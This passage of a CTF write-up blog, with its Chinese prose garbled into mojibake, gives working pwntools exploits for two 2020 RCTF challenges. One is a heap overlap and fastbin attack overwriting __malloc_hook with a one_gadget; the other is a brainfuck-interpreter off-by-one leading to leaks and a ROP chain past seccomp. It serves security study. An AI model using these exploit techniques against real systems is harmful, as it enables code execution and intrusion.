·å‰©ä¸‹çš„éƒ¨åˆ†ä¼šç§»åŠ¨è¿›overlapçš„chunkä¸­ï¼Œè¿™ä¸ªæ—¶å€™å†ä½¿ç”¨showåŠŸèƒ½æ³„éœ²åœ°å€ï¼Œé€šè¿‡<code>main_arena</code>æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºlibcåŸºåœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)  <span class="comment"># 0x100</span></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">once(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x28</span> + p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><p>é™¤äº†ä½¿ç”¨<code>unsorted bin</code>æ¥æ³„éœ²åœ°å€ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>large bin</code>çš„chunkæ¥æ³„éœ²åœ°å€ã€‚</p><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>åœ¨çŸ¥é“libcåŸºåœ°å€ä¹‹åï¼Œæˆ‘ä»¬å‰©ä¸‹çš„å·¥ä½œå°±æ˜¯å‘<code>__malloc_hook</code>æˆ–è€…<code>__free_hook</code>ä¸­å†™å…¥<code>one_gadget</code>ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬æ–°åˆ†é…ä¸€ä¸ªå¤§å°ä¸º0x60çš„noteï¼Œè¿™ä¸ªçš„chunkä¼šå’ŒåŸæ¥çš„index=3çš„noteé‡åˆï¼Œæˆ‘ä»¬å†é‡Šæ”¾index=3çš„noteï¼Œä¸ºäº†è®©å®ƒè¿›å…¥<code>fastbin</code>ï¼Œæˆ‘ä»¬å¿…é¡»è¦å…ˆæŠŠ<code>tcache</code>å¡æ»¡7ä¸ªã€‚é‡Šæ”¾ä¹‹åï¼Œæˆ‘ä»¬æ‹¿æ–°åˆ†é…çš„noteå†™å…¥éœ€è¦ä¼ªé€ çš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å†æ¬¡åˆ†é…ä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡å°±èƒ½æ‹¿åˆ°ä¼ªé€ åœ°å€çš„chunkã€‚</p><p>è¿™ä¸ªä¼ªé€ åœ°å€ä¹Ÿæ˜¯å¾ˆè®²ç©¶çš„ï¼Œå®ƒçš„sizeåŒºåŸŸå¿…é¡»è¦ç¬¦åˆfastbinçš„æ£€æŸ¥ï¼Œè€Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬ä¸€èˆ¬ä¼šå†™<code>__malloc_hook</code>ä¹‹å‰åç§»çš„ä¸€éƒ¨åˆ†ï¼Œé€šè¿‡åç§»èƒ½å¤Ÿå‡‘å‡ºsizeå¤§å°ä¸º<code>0x7f</code>ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜èƒ½è¦†ç›–<code>__realloc_hook</code>ã€‚å¦‚æœæˆ‘ä»¬çš„one_gadgetæ— æ³•æ»¡è¶³æ¡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨<code>__realloc_hook</code>ä¸­å†™å…¥one_gadgetï¼Œ<code>__malloc_hook</code>ä¸­å†™å…¥<code>__libc_realloc</code>åŠ ä¸Šä¸€å®šåç§»ã€‚è¿™ä¸ªåç§»æ˜¯å†³å®špopçš„æ•°é‡ï¼Œä¸ºäº†æ»¡è¶³æ¡ä»¶ä»¥æ­¤æ¥è°ƒæ•´æ ˆçš„ä½ç½®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, p64(fake_addr))</span><br><span class="line">new(<span class="number">8</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">'a'</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ä¸€é“<code>chunk overlap</code>+<code>fastbin attack</code>çš„é¢˜ç›®ã€‚é‡Œé¢é€šè¿‡è°ƒè¯•å­¦åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„åœ°æ–¹ï¼Œ<code>calloc</code>åœ¨åˆ†é…chunkçš„æ—¶å€™ï¼Œä¸ä¼šä»tcacheä¸­æ‹¿chunkï¼Œä»”ç»†æƒ³æƒ³<code>calloc</code>åœ¨åˆ†é…çš„æ—¶å€™ä¼šå¯¹å†…å­˜åšåˆå§‹åŒ–æ“ä½œï¼Œå¯èƒ½ä¹Ÿæ˜¯å› ä¸ºè¿™ä¸ªåŸå› æ‰€ä»¥åˆ†é…tcacheç¼“å­˜çš„æ„ä¹‰ä¸å¤§ã€‚ï¼ˆçº¯å±æ¨æµ‹ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./note'</span>)</span><br><span class="line"><span class="comment">#io = remote('124.156.135.103', 6004)</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index, size)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    io.send(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, message)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">'Message: '</span>)</span><br><span class="line">    io.sendline(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">once</span><span class="params">(index, message)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'7'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">'Message: '</span>)</span><br><span class="line">    io.send(message)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">new(<span class="number">0</span>, <span class="number">21524788884141834</span>)</span><br><span class="line">sell(<span class="number">0</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">-5</span>,<span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0xfffffffffffffff</span>) + <span class="string">'\x01'</span>)  <span class="comment"># fill money with 0xfffffffffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(i, <span class="number">0x60</span>)</span><br><span class="line">    sell(i)</span><br><span class="line"></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)  <span class="comment"># 0x100</span></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">once(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x28</span> + p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'leak_addr: '</span> + hex(leak_addr))</span><br><span class="line"></span><br><span class="line">main_arena = leak_addr - <span class="number">96</span></span><br><span class="line"><span class="comment"># libc_addr = main_arena - 0x3ebc40</span></span><br><span class="line"><span class="comment"># one_gadget = libc_addr + 0x4f322  # 0x4f2c5 0x10a38c</span></span><br><span class="line"></span><br><span class="line">libc_addr = main_arena - <span class="number">0x1e4c40</span></span><br><span class="line">one_gadget = libc_addr + <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'libc: '</span> + hex(libc_addr))</span><br><span class="line">log.info(<span class="string">'malloc_hook: '</span> + hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">fake_addr = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">7</span>, p64(fake_addr))</span><br><span class="line">new(<span class="number">8</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">'a'</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line">pause()</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="bf"><a href="#bf" class="headerlink" title="bf"></a>bf</h2><p>ä¸€é“å¤´ç§ƒçš„c++é¢˜ç›®ï¼Œä»”ç»†åˆ†æä»£ç å¯ä»¥çŸ¥é“æˆ‘ä»¬è¾“å…¥çš„codeä¼šè¢«å½“åšbrainfuckä»£ç è§£æï¼Œéšåæ‰§è¡Œã€‚æ¼æ´ç‚¹å‡ºç°åœ¨ç§»åŠ¨æŒ‡é’ˆçš„æ“ä½œä¸Šã€‚</p><img src="/2020/08/01/2020rctf-some-pwn/1.png"><p>è¿™é‡Œé€€å‡ºçš„æ¡ä»¶æ˜¯æŒ‡é’ˆå¤§äºå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå¿½è§†äº†ç­‰äºçš„æ—¶å€™ï¼Œæ‰€ä»¥å¯ä»¥æ­£å¥½è¯»å–æˆ–è€…ä¿®æ”¹å­—ç¬¦ä¸²çš„æœ€ä½å­—èŠ‚ã€‚è€Œè¿™ä¸ªæœ€ä½å­—èŠ‚åˆšå¥½æ˜¯å­—ç¬¦ä¸²ç»“æ„çš„ä¸€ä¸ªæŒ‡é’ˆå®ƒæŒ‡å‘å­˜å‚¨æ•°æ®çš„bufåœ°å€ï¼Œå½“å­—ç¬¦ä¸²çš„é•¿åº¦å°äºç­‰äº16æ—¶ä¼šæŠŠç»“æ„ä½“æ”¾åœ¨æ ˆä¸Šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦åšçš„æ˜¯è¦†ç›–è¿™ä¸ªæŒ‡é’ˆè®©å®ƒæŒ‡å‘å…¶ä»–ä½ç½®ï¼Œé€šè¿‡å†æ¬¡å†™å…¥å†…å®¹å¯ä»¥å®Œæˆrop chainã€‚åœ¨è¿™ä¹‹åçš„è¿™é“é¢˜é™åˆ¶äº†<code>execve</code>ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨orwçš„æ–¹æ³•è·å–flagã€‚</p><h3 id="æ³„éœ²stackå’Œlibcåœ°å€"><a href="#æ³„éœ²stackå’Œlibcåœ°å€" class="headerlink" title="æ³„éœ²stackå’Œlibcåœ°å€"></a>æ³„éœ²stackå’Œlibcåœ°å€</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²å‡ºæŒ‡é’ˆçš„æœ€ä½ä½ï¼Œå› ä¸ºåœ¨æœ€åè¿”å›çš„æ—¶å€™éœ€è¦æŠŠæŒ‡é’ˆæœ€ä½ä½è¿˜åŸï¼Œä¸ç„¶ææ„å‡½æ•°ä¼šæŠ¥é”™ã€‚</p><p>è¾“å…¥brainfuckçš„ä»£ç <code>,[.&gt;,]&gt;.</code>ï¼Œå…¶ä¸­<code>,</code>è¯»å…¥ä¸€å­—èŠ‚å†™å…¥åˆ°å½“å‰ä½ç½®ï¼Œ<code>[]</code>ç±»ä¼¼äºå¾ªç¯å¦‚æœå½“å‰ä½ç½®çš„æ•°æ®ä¸ä¸º0åˆ™ä¼šä»<code>]</code>è·³å›<code>[</code>ï¼Œ<code>.</code>è¾“å‡ºå½“å‰ä½ç½®çš„æ•°æ®ï¼Œ<code>&gt;</code>æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä¸ªå­—èŠ‚ã€‚æ€»ç»“æ¥è¯´ï¼Œè¿™æ®µä»£ç å°±æ˜¯å¯ä»¥ä¸æ–­çš„è¯»è¾“å…¥ç›´åˆ°æœ‰<code>\x00</code>å‡ºç°å¾ªç¯é€€å‡ºï¼Œå†ç§»åŠ¨ä¸€ä½è¾“å‡ºæ•°æ®ã€‚</p><p>è¾“å…¥è¿™æ®µä»£ç ä¹‹åï¼Œæˆ‘ä»¬è¾“å…¥0x3ffçš„æ•°æ®æœ«å°¾è·Ÿç€<code>\x00</code>ï¼Œè¿™æ ·å°±èƒ½ç§»åŠ¨0x400å­—èŠ‚å¤§å°è¯»å–åˆ°stringçš„æœ€ä½å­—èŠ‚ã€‚åœ¨è·å¾—æœ€ä½å­—èŠ‚åä¼šåˆ¤æ–­è¿™ä¸ªæ˜¯å¦ç¬¦åˆæˆ‘ä»¬æ”»å‡»çš„è¦æ±‚ï¼Œå› ä¸ºæœ€ä½å­—èŠ‚è¿‡å¤§ä¼šè®©åé¢å†™å…¥çš„rop chainè¶…è¿‡å¯æ§èŒƒå›´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">",[.&gt;,]&gt;."</span>)</span><br><span class="line">p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)  <span class="comment"># 0x400</span></span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"B"</span>*<span class="number">0x3ff</span>)</span><br><span class="line">low_bit = ord(p.recv(<span class="number">1</span>))</span><br><span class="line">info(<span class="string">'low_bit: '</span>+ hex(low_bit))</span><br><span class="line"><span class="keyword">if</span> low_bit + <span class="number">0x70</span> &gt;= <span class="number">0x100</span>: <span class="comment"># :(</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>æœ‰äº†åˆé€‚çš„æœ€ä½å­—èŠ‚ä¹‹åï¼Œæˆ‘ä»¬æŸ¥çœ‹æ ˆä¸Šæœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨åˆ°çš„æ•°æ®ã€‚</p><img src="/2020/08/01/2020rctf-some-pwn/2.png"><p>åœ¨åœ°å€<code>0x7ffd464a22d0</code>åé¢åç§»0x20çš„ä½ç½®å¤„èƒ½çœ‹åˆ°ä¸€ä¸ªå’Œæ ˆç›¸å…³çš„åœ°å€ï¼Œæ³„éœ²å‡ºæ¥æˆ‘ä»¬å°±èƒ½è·å¾—æ ˆåœ°å€ï¼Œå†å¾€åé¢çœ‹åˆ°è¿”å›åœ°å€å¤„æ˜¯libcç›¸å…³çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ¬¡æ³„éœ²å‡ºè¿”å›åœ°å€å°±èƒ½å¾—åˆ°libcçš„åŸºåœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.send(chr(low_bit+<span class="number">0x20</span>))  </span><br><span class="line">p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0xd8</span>  </span><br><span class="line">info(<span class="string">"stack : "</span> + hex(stack))</span><br><span class="line">p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.send(chr(low_bit+<span class="number">0x38</span>))</span><br><span class="line">p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x21b97</span></span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">p.send(<span class="string">'y'</span>)</span><br></pre></td></tr></table></figure><h3 id="æ„é€ ROP-chainæ‰§è¡Œread"><a href="#æ„é€ ROP-chainæ‰§è¡Œread" class="headerlink" title="æ„é€ ROP chainæ‰§è¡Œread"></a>æ„é€ ROP chainæ‰§è¡Œread</h3><p>é¦–å…ˆæ˜¯æ‰¾gadgetï¼Œ<code>pop rdi</code>ä¹‹ç±»çš„è¿˜æ˜¯å¾ˆå¥½æ‰¾çš„ï¼Œç”¨å·¥å…·ä¸€ä¸‹å°±èƒ½å‡ºæ¥ï¼Œä½†æ˜¯è¿™ä¸ª<code>syscall; ret;</code>çš„gadgetç”¨å·¥å…·æ²¡æœ‰æ‰¾åˆ°ï¼Œæ‰€ä»¥æˆ‘åœ¨libcä¸­å¼€å§‹äººå·¥æŸ¥æ‰¾ï¼Œæœ€åå‘ç°äº†<code>get_uid</code>ä¹‹ç±»çš„å‡½æ•°ï¼Œå®ƒçš„æ•´ä½“å°±åªæœ‰ä¸‰å¥æ±‡ç¼–ï¼Œæœ€åä¸¤å¥å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚è¿™é‡Œå°±å­¦åˆ°äº†ä¸€ç‚¹ï¼Œä»¥åæ‰¾syscallçš„gadgetç›´æ¥æ‰¾<code>get_uid</code>å°±å¥½äº†ã€‚</p><p>ç„¶åæ˜¯å†™å…¥æ•°æ®äº†ï¼Œå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬å†™å…¥æ•°æ®æ˜¯åˆ©ç”¨çš„ä¹‹å‰å†™brainfuckä»£ç çš„åŠŸèƒ½ï¼Œè¿™ä¸ªæ ˆç©ºé—´å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„ä»£ç å­—ç¬¦ä¸²è¢«ç ´åï¼Œè€Œæ¯æ¬¡å†™å…¥çš„15å­—èŠ‚ä¸­çš„å‰8ä¸ªå­—èŠ‚ä¼šè¢«è¦†ç›–æˆæˆ‘ä»¬è¾“å…¥çš„brainfuckä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨æ¯è½®å¾ªç¯ä¼šé‡å¤å†™å…¥ä¸€æ®µæ•°æ®æ¥æ¶ˆé™¤è¿™ç§å½±å“ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_low_bit</span><span class="params">(low_bit,offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+offset))</span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"\x00"</span>*<span class="number">0xf</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">rop_chain = [</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,p_rdi,<span class="number">0</span>,p_rdx_rsi,<span class="number">0x100</span>,stack,libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop_chain_len = len(rop_chain)  <span class="comment"># len=8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(rop_chain_len<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">    write_low_bit(low_bit,<span class="number">0x57</span><span class="number">-8</span>*(rop_chain_len<span class="number">-1</span>-i))</span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'\x00'</span>+p64(rop_chain[i<span class="number">-1</span>])+p64(rop_chain[i])[:<span class="number">6</span>])</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br></pre></td></tr></table></figure><p>è¿™ç§è¾“å…¥åˆšå¥½è®©rop chainèƒ½å¤Ÿè¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œåœ¨å‡½æ•°è¿”å›ä¹‹åä¼šè¯»å…¥orwçš„ropæ¥ç»•è¿‡seccompçš„é™åˆ¶ã€‚å…¶ä¸­æ¯”è¾ƒå·§å¦™çš„æ˜¯åˆ©ç”¨é”™ä½å’Œ<code>\x00</code>æ¥è¡¥ä½ã€‚</p><h3 id="readè¯»å…¥orwè·å¾—flag"><a href="#readè¯»å…¥orwè·å¾—flag" class="headerlink" 